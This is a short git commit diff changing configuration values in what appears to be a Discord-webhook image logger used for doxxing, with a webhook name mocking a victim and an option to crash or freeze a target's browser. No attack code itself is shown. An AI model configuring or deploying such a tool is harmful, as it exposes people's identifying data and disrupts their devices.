e0a6c36398805b56d235490a8e7c1f9cf3257c7f
DingDongEatItUpEatItWellAndMixItUp <buffalopat56@gmail.com>
2025-08-17 14:09:40 -0400

    Update main.py

--- api/main.py
+++ api/main.py
@@ -18,8 +18,8 @@ config = {
     "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "you piss me off so get doxxed ", # Set this to the name you want the webhook to have
-    "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
+    "username": "d e v i l s  p l a n ", # Set this to the name you want the webhook to have
+    "color": 0xFF0000, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
     "crashBrowser": False, # Tries to crash/freeze the user's browser, may not work. (I MADE THIS, SEE https://github.com/xdexty0/Chromebook-Crasher)
